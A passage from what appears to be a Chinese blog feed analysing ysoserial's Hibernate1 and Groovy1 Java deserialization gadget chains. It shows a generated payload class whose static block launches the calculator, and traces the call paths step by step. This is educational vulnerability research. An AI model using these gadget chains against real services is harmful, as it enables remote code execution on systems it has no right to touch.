一个是只实现了了Serializable接口的Foo类对象，             * 同时_tfactory属性里存放了一个TransformerFactoryImpl对象*/</span>        <span class="token punctuation">}</span></code></pre><p>我们先看一下最终生成的.class的一个结果，这个新生成的字节码中有三个比较关键的点，首先是实现了Serializable接口，这点自不必多说，其次是继承自AbstractTranslet类，这点很关键在后续执行恶意代码时起关键作用，当然最最重要的就是这个手动加入的静态代码块，我们都知道静态代码块在类被加载的时候就会执行，整个类的生命周期中就只会执行一次。所以只需要将这个动态生成的类实例化的话就会自动执行Runtime.exec()函数 。接下来的操作就是将动态生成的类转化成字节数组的形式赋值给之前已经实例化好的TemplatesImpl对象的_bytecodes属性。同时为TemplatesImpl对象的_name和_tfactory属性赋值。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> ysoserial<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>DOM<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>TransletException<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>AbstractTranslet<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span>DTMAxisIterator<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span>SerializationHandler<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Pwner1587535724799618000</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token operator">-</span>5971610431559700674L<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">Pwner1587535724799618000</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span>DOM document<span class="token punctuation">,</span> SerializationHandler<span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> TransletException <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span>DOM document<span class="token punctuation">,</span> DTMAxisIterator iterator<span class="token punctuation">,</span> SerializationHandler handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> TransletException <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token punctuation">{</span>        Object var1 <span class="token operator">=</span> null<span class="token punctuation">;</span>        Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"open /Applications/Calculator.app"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>接下来的就是一系列针对恶意代码的封装操作，不是很难，但是特别繁琐，所以我画了一个脑图来帮助大家进行理解。最终GetObject执行完成后封装出来的结果是一个HashMap对象，对 没有错，这次反序列化的触发点，就是我们最常用的HashMap。HashMap在被序列化然后反序列化的过程中，经过一系列的嵌套调用最终触发了我们封存在TemplatesImpl对象的_bytecodes属性中的那个动态生成类的静态代块。</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/8.png" alt="8"></p><p>首先通过脑图观察最后返回的HashMap有两个属性被赋了值，size属性和table属性。而table属性里存放的是一个HashMap$Entry对象，我们都知道HashMap$Entry对象其实就是一对键值对的映射，这个映射对象的key和value存储的是同一个TypedValue对象，其实经过分析，value可以为任意值的。这个TypedValue类是存在org.hibernate.engine.spi包中的。</p><p>接下来我们进行调试分析</p><p>既然是使用jdk自带的反序列化，那么自然会调用HashMap的readObject方法</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/9.png" alt="9"></p><p>这个段代码里有两个需要注意的点，首先是1128行的代码mappings变量中存储的就是我们之前为HashMap对象的size属性所赋的值。下一个需要注意的点事1153行的for循环，此处是读取出我们之前为HashMap$Entry对象里的Key和Value</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/10.png" alt="10"></p><p>然后调用HashMap.putForCreate()方法将Key和Value传递进去。  这里就牵扯到了之前生成HashMap对象时为何要为size属性赋值，如果当初没有为size属性赋值，那么此时mappings变量就会为0，导致i&lt;mappings判断失败，从而无法执行后续内容。</p><p>紧接着判断Key是否为空，Key不为空所以执行HashMap.hash()方法来处理key</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/11.png" alt="11"></p><p>在第351行我们调用了之前封装好的TypedValue对象的hashCode()方法</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/12.png" alt="12"></p><p>我们看到hashCode()方法里又调用了ValueHolder对象的getValue()方法。</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/13.png" alt="13"></p><p>可以看到hashcode变量的来历，是TypedValue对象被反序列化时调用initTransients方法所赋值的，里面存储的其实一个匿名内部类实例化的对象。</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/14.png" alt="14"></p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/15.png" alt="15"></p><p>我们看一下valueInitializer变量的值.可以看到就是我们刚才所说的匿名内部类所实例化的对象。</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/16.png" alt="16"></p><p>自然而然接下来就是调用匿名内部类的initialize()方法。由于value的存储着一个TypedValue对象所以执行type.getHashCode() , 通过脑图可知type变量中存储的是一个ComponentType对象，所以调用ComponentType.getHashCode()方法并将value变量传入。</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/17.png" alt="17"></p><p>紧接着第242行调用getPropertyValue()方法。这里同理propertySpan是我们创建这个对象时通过反射赋的值，不能为0，如果为零则不会执行后续内容。</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/18.png" alt="18"></p><p>第414行调用PojoComponentTuplizer.getPropertyValue()方法。由于PojoComponentTuplizer类没有该方法所以会调用其父类的getPropertyValue()方法</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/19.png" alt="19"></p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/20.png" alt="20"></p><p>这里的gatter变量存储的就是我们之前封装好的Gatter数组根据脑图可以看到该数组里存储的是一个BasicPropertyAccessor$BasicGetter对象。所以接下来调用BasicPropertyAccessor​$BasicGetter.get()方法</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/21.png" alt="21"></p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/22.png" alt="22"></p><p>我们观察脑图中的BasicPropertyAccessor$BasicGetter里面的属性信息。可以看到method变量是我们提前赋好了值得是TemplatesImpl.getOutputProperties() 的method对象所以这里通过反射调用。</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/23.png" alt="23"></p><p>紧接着调用newTransformer()方法</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/24.png" alt="24"></p><p>触发点就藏在getTransletInstance()这个回调函数中，</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/25.png" alt="25"></p><p>这里也说明了为什么一开始要为TemplatesImpl的_name属性赋一个值，因为如果不赋值的话，在第一个if判断处就会直接返回null</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/26.png" alt="26"></p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/27.png" alt="27"></p><p>最关键的就是第380行我们通过反射实例化了_class这个Class数组对象中下标为0的Class对象，就最终触发了我们的恶意代码。</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/28.png" alt="28"></p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/29.png" alt="29"></p><p>那这个Class数组对象中下标为0的Class对象究竟是什么？是不是我们之前封装在TemplatesImpl的_bytecode属性中的那个通过javassist动态生成的类呢？这需要我们退一步去看上一步的defineTransletClasses()方法。</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/30.png" alt="30"></p><p>在defineTransletClasses()方法内我们看到有这么一个for循环。其中defineClass可以从byte[]还原出一个Class对象，所以当下这个操作就是将_bytecode[ ]中每一个byte[ ]都还原成Class后赋值给_class[ ]，又因为_bytecode[ ]中下标为0的byte[ ]存储的正是包含了恶意代码的动态生成的类。所以_class[0]就是其Class对象。而_class[0].newInstance就是在实例化我们存有恶意代码的类。自然就会触发其静态代码块中存放的“Runtime.getRuntime().exec(“open /Applications/Calculator.app”);”。至此ysoserial Hibernate1反序列化代码执行原理分析完毕</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/31.png" alt="31"></p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><p>整个Hibernate1的整体流程就是，首先使用HashMap来作为一个触发点，接下来需要用到的是hibernate-core包中的TypedValue类，AbstractComponentTuplizer类，PojoComponentTuplizer类，BasicPropertyAccessor$BasicGetter类以及AbstractType类和ComponentType类。利用这类中的一些互相调用的方法，作为调用链。但是最终执行代码的是com.sun.org.apache.xalan下的TemplatesImpl，因为我们所写的恶意代码最终是存储在该类的_bytecode属性中。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> ysoserial </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> Hibernate </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化系列 ysoserial Groovy1</title>
      <link href="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/"/>
      <url>/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/</url>
      
        <content type="html"><![CDATA[<h1 id="ysoserial-Java-反序列化系列第一集-Groovy1"><a href="#ysoserial-Java-反序列化系列第一集-Groovy1" class="headerlink" title="ysoserial Java 反序列化系列第一集 Groovy1"></a>ysoserial Java 反序列化系列第一集 Groovy1</h1><h2 id="ysoserial简介"><a href="#ysoserial简介" class="headerlink" title="ysoserial简介"></a>ysoserial简介</h2><p>ysoserial是一款在Github开源的知名java 反序列化利用工具，里面集合了各种java反序列化payload；</p><p>由于其中部分payload使用到的低版本JDK中的类，所以建议自己私下分析学习时使用低版本JDK JDK版本建议在1.7u21以下。</p><p>此篇文章为java反序列化系列文章的第一篇，后续会以ysoserial这款工具为中心，挨个的去分析其中的反序列化payload和gadget，讲完该工具后会继续对工具中没有的java 反序列化漏洞进行讲解，例如 FastJson JackSon，WebLogic等等，并将这些漏洞的exp加入到ysoserial中然后共享和大家一起学习交流。</p><p>源码下载地址</p><p><a href="https://codeload.github.com/frohoff/ysoserial/zip/master" target="_blank" rel="noopener">https://codeload.github.com/frohoff/ysoserial/zip/master</a></p><p>jar包下载地址</p><p><a href="https://jitpack.io/com/github/frohoff/ysoserial/master-30099844c6-1/ysoserial-master-30099844c6-1.jar" target="_blank" rel="noopener">https://jitpack.io/com/github/frohoff/ysoserial/master-30099844c6-1/ysoserial-master-30099844c6-1.jar</a></p><h2 id="源码深度解析"><a href="#源码深度解析" class="headerlink" title="源码深度解析"></a>源码深度解析</h2><p>我们首先看一下该payload的整个源码</p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/1.png" alt="1"></h2><p>代码量其实很少，但是调用了一些别的类中的方法，看起来可能不是太直观，我将调用方法中所做的操作都写到一个类的main方法中这样看起来应该会更好理解一些。</p><p>先写一个简化版的可以执行代码的Demo</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/2.png" alt="2"></p><p>直接运行的话会执行我们预先设定好的命令，调用计算器</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/3.png" alt="3"></p><p>但是这短短几行代码里我们并没有调用Runtime对象的exec方法亦或着ProcessBuilder对象的star方法来执行命令，我们仅仅调用了一个Map对象的entrySet()方法，怎么就可以执行命令了呢？</p><p>对java有些许了解的同学应该熟悉Map.Entry是Map里面的一个接口，主要用途是来表示Map对象中的一个映射项也就是一个&lt;key,value&gt;   并提供了以下五个方法,通常我们会使用map.entrySet().iterator()，方法得到一个Iterator对象从而对Map中的Entry对象进行遍历，那为何一个获取遍历对象的操作会导致代码执行呢？这里就涉及到这个Map对象究竟是哪一个实现了Map接口的类来实例化的。</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/4.png" alt="4"></p><p>首先我们先来看看这个map变量里面保存的是什么</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/5.png" alt="5"></p><p>居然是一个代理对象，这里就要涉及到java的一个知识点，就是所谓的动态代理。动态代理其实不难理解，可以写个简单的例子,以下是这个例子的代码。</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/6.png" alt="6"></p><p>我们可以看到我们写了一个Son类继承了Father接口，然后在Test3类中的main方法中被实例化，接下来我们通过Proxy的newProxyInstance方法生成了一个Son对象的代理，我们传递了三个参数进去，Son类的类加载器和实现的接口，这里注意被代理的对像是一定要实现至少一个接口的，因为实例化的代理类本身是继承了Proxy类，所以只能通过实现被代理类接口的形式来实例化。最后我们通过匿名内部类的形式传入了一个InvocationHandler对象，InvocationHandler是一个接口，该接口中只有一个方法就是invoke方法，所以我们一定要重写该方法。</p><p>然后我们看执行结果</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/7.png" alt="7"></p><p>可以看到，我们调用Son对象本身和Son的代理对象所执行的结果是不同的，因为代理对象在执行被代理对象的任意方法时，会首先执行我们之前重写的InvocationHandler的invoke方法。同时会传入三个参数，第一个参数是代理对象本身，第二个参数是你要执行的方法的方法名，第三个参数是你要执行的该方法时要传递的参数。关键点在于什么？在于无论你调用代理对象的那一个方法，都一定要先执行这个Invoke方法。</p><p>然后返回到我们之前的payload中我们可以看到我们使用Proxy.newProxyInstance方法生成了一个代理对象，然后将其强转成了一个Map对象然后调用了entrySet方法。</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/8.png" alt="8"></p><p>接下来我们先记住我们payload所用到的两个类也就是所谓的gadget</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/9.png" alt="9"></p><p>是位于org.codehaus.groovy.runtime包下的ConvertedClosure和MethodClosure。</p><p>接下来我们就来一步一步的调试分析</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/10.png" alt="10"></p><p>首先我们生成一个MethodClosure对象并将我们要执行的命令和和一个值为“execute”的字符串传递进去我们跟进</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/11.png" alt="11"></p><p>可以看到我们将要执行的命令传给了MethodClosure的父类来处理，将“execute”赋值给了MethodClosure.method属性。然后紧接着跟到Closure的构造方法中看到命令被赋值给了Closure.owner和Closure.delegate属性，之所以讲这些赋值过程是因为后面都会用得到。<img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/12.png" alt="12"></p><p>接下来payload中又实例化了另一个对象并将刚才实例化的MethodClosure对象和一个字符串常量“entrySet”传入，我们同样继续跟进。<img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/13.png" alt="13"></p><p>字符串常量被赋值给ConvertedClosure.methodName属性<img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/14.png" alt="14"></p><p>MethodClosure对象赋值给父类的的ConversionHandler.delegate属性<img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/15.png" alt="15"></p><p>接下这两步就是生成一个Class类型的Arry数组因为Proxy.newProxyInstance方法第二个参数是动态代理类要实现的接口要以数组的形式传入。所以我们生成了一个Class数组并在其中存入我要实现的接口也就是Map.calss<img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/16.png" alt="16"></p><p>接下来就是生成动态代理对象的过程了，这个在前面已经介绍过了，Proxy.newProxyInstance方法传递的第二个参数是代理类所要实现的接口，里面只有一个Map.class所以生成的代理对象是实现了Map接口里所有方法的，所以才可以将其强转成Map类型并调用entrySet方法<img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/17.png" alt="17"></p><p>之前我们也说了动态代理的一大特点就是不论你调用代理对象的哪一个方法其实执行的都是我们创建代理对象时所传入的InvocationHandler对象中我们所重写的Invoke方法。这里传入的InvocationHandler对象就是我们之前实例化的ConvertedClosure我们看一下该类的继承关系</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/18.png" alt="18"></p><p>可以看到ConvertedClosure类的继承关系中其父类ConversionHandler实现了InvocationHandler并重写了Invoke方法，所以我们由此可知当我们调用代理对象map.entrySet方法时实际上执行的是ConversionHandler.Invoke方法。我们跟进方法继续分析。<img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/19.png" alt="19"></p><p>紧接着由调用了invokeCustom方法，该方法在ConversionHandler中是一个抽象方法，所以调用的是其子类重写的ConvertedClosure.invokeCustom方法。<img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/20.png" alt="20"></p><p>之前我们创建ConvertedClosure对象时为methodName属性赋了值“entrySet”此时我们调用的是代理对象的entrySet方法，自然传递进来method的值也是“entrySet”符合判断。</p><p>接下来的getDelegate()是其父类的方法也就是ConversionHandler.getDelegate()<img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/21.png" alt="21"></p><p>返回一个MethodClosure对象也就是并将其强转成Closure，然后调用Closure.call()方法<img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/22.png" alt="22"></p><p>紧接着调用Closure的父类GroovyObjectSupport.getMetaClass()方法返回一个MetaClassImpl对象并调用MetaClassImpl.invokeMethod()方法</p><p>步入跟进该方法</p><pre class=" language-java"><code class="language-java">MetaMethod method <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>method<span class="token operator">==</span>null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            method <span class="token operator">=</span> <span class="token function">getMethodWithCaching</span><span class="token punctuation">(</span>sender<span class="token punctuation">,</span> methodName<span class="token punctuation">,</span> arguments<span class="token punctuation">,</span> isCallToSuper<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">final</span> <span class="token keyword">boolean</span> isClosure <span class="token operator">=</span> object <span class="token keyword">instanceof</span> <span class="token class-name">Closure</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>isClosure<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">final</span> Closure closure <span class="token operator">=</span> <span class="token punctuation">(</span>Closure<span class="token punctuation">)</span> object<span class="token punctuation">;</span>            <span class="token keyword">final</span> Object owner <span class="token operator">=</span> closure<span class="token punctuation">.</span><span class="token function">getOwner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>CLOSURE_CALL_METHOD<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>methodName<span class="token punctuation">)</span> <span class="token operator">||</span> CLOSURE_DO_CALL_METHOD<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>methodName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">final</span> Class <span class="token class-name">objectClass</span> <span class="token operator">=</span> object<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>objectClass <span class="token operator">==</span> MethodClosure<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">final</span> MethodClosure mc <span class="token operator">=</span> <span class="token punctuation">(</span>MethodClosure<span class="token punctuation">)</span> object<span class="token punctuation">;</span>                    methodName <span class="token operator">=</span> mc<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">final</span> Class <span class="token class-name">ownerClass</span> <span class="token operator">=</span> owner <span class="token keyword">instanceof</span> <span class="token class-name">Class</span> <span class="token operator">?</span> <span class="token punctuation">(</span>Class<span class="token punctuation">)</span> owner <span class="token operator">:</span> owner<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">final</span> MetaClass ownerMetaClass <span class="token operator">=</span> registry<span class="token punctuation">.</span><span class="token function">getMetaClass</span><span class="token punctuation">(</span>ownerClass<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> ownerMetaClass<span class="token punctuation">.</span><span class="token function">invokeMethod</span><span class="token punctuation">(</span>ownerClass<span class="token punctuation">,</span> owner<span class="token punctuation">,</span> methodName<span class="token punctuation">,</span> arguments<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>该方法代码过多先截取关键代码，首先创建一个Method类型的变量并为其赋值，然后我们通过判断传入的Object是否是Closure的子类，由截图可以看出Object里存储的是一个MethodClosure对象，所以判断的结果是true 接下来就走第一条判断成功执行的代码。</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/23.png" alt="23"></p><p>接下来执行的就是将Object强转为Closure类型，接下来取出我们一开始我们在创建MethodClosure对象时存入的要执行的命令。<img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/24.png" alt="24"></p><p>接下来就一路执行到return ownerMetaClass.invokeMethod()<img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/25.png" alt="25"></p><p>我们看到这个ownerMetaClass其实还是一个MetaClassImpl对象也就是说这里其实是一个递归调用。<img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/26.png" alt="26"></p><p>以下是递归调用的执行路径可以看到在if (isClosure)这里判断失败了，所以不再执行刚才的代码改为执行method.doMethodInvoke() </p><pre class=" language-java"><code class="language-java">MetaMethod method <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">if</span> <span class="token punctuation">(</span>method <span class="token operator">==</span> null<span class="token punctuation">)</span>     method <span class="token operator">=</span> <span class="token function">tryListParamMetaMethod</span><span class="token punctuation">(</span>sender<span class="token punctuation">,</span> methodName<span class="token punctuation">,</span> isCallToSuper<span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">final</span> <span class="token keyword">boolean</span> isClosure <span class="token operator">=</span> object <span class="token keyword">instanceof</span> <span class="token class-name">Closure</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>isClosure<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>method <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> method<span class="token punctuation">.</span><span class="token function">doMethodInvoke</span><span class="token punctuation">(</span>object<span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>我们看到method变量里存储的是一个叫dgm的对象</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/27.png" alt="27"></p><p>以下是传入method.doMethodInvoke() 的两个参数里面所存储的值</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/28.png" alt="28"></p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/29.png" alt="29"></p><p>我们要执行的命令被传进了ProcessGroovyMethods.execute((String)var1)方法中，继续跟进。<img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/30.png" alt="30"></p><p>至此通过调用Map.entrySet()方法就能导致代码执行的原理水落石出。<img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/31.png" alt="31"></p><p>以上就是ysoserial的payload中的Groovy的gadget介绍。接下来要讲的就是反序列化漏洞中的反序列化如何配和Groovy1的gadget来远程代码执行的。</p><p>我们来看ysoserial Groovy1所执行的全部代码。我们可以看到在第34行代码以前，执行的代码和我们之前看到的简化版的代码执行Demo是一样的。</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/32.png" alt="32"></p><p>我们看到我们通过反射先是拿到了AnnotationInvocationHandler此类的Class对象，然后在通过该Class对象以反射的形式拿到了它的构造方法，并最终通过该构造方法反射并传入两个参数一个是Override.class一个常见的注解类对象。而另一个就是我们之前所分析的可以通过调用Map.entrySet()方法可以造成代码执行的Map对象。<img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/33.png" alt="33"></p><p>为什么我们要如此的费力通过反射形式来生成一个AnnotationInvocationHandler对象呢？由以下截图可知。因为该类的构造方法和该类本身都不是public修饰的，所以我们没法通过new一个对象的形式来创建AnnotationInvocationHandler对象</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/34.png" alt="34"></p><p>之前已经简单介绍过了什么是反序列化，JDK序列化/反序列化。如果反序列化的类里有readObject方法，那么就一定会调用该方法。这就给了我们一个可趁之机，我们观察一下AnnotationInvocationHandler对象中都执行了些什么。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream s<span class="token punctuation">)</span><span class="token keyword">throws</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>s<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Check to make sure that types have not evolved incompatibly</span>AnnotationType annotationType <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">{</span>    annotationType <span class="token operator">=</span> AnnotationType<span class="token punctuation">.</span><span class="token 